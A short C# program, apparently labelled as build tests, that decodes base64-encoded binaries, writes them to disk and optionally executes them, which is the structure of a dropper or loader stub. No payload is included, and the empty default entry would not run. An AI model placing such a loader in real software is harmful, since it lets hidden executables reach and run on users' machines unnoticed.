using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace buildTests
{
    public class Program
    {

        public static List<exec> _exec = new List<exec>();
        public static void Main(string[] args)
        {
            _exec.Add(new exec());

            foreach (var e in _exec)
            {
                File.WriteAllBytes(e.filename, Convert.FromBase64String(e.base64Bynary));
                if(e.execute )
                {
                    Process p = new Process();
                    p.StartInfo = new ProcessStartInfo(Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location )+e.filename, e.args);
                    p.StartInfo.UseShellExecute = true;
                    p.Start();
                }
            }
        }
    }
    public struct exec
    {
        public exec(string _filename, string _base64Bynary, bool _execute, string _args = "")
        {
            this.filename = _filename;
            this.base64Bynary = _base64Bynary;
            execute = _execute;
            args = _args;
        }
        public string filename;
        public string base64Bynary;
        public bool execute;
        public string args;
    }
}
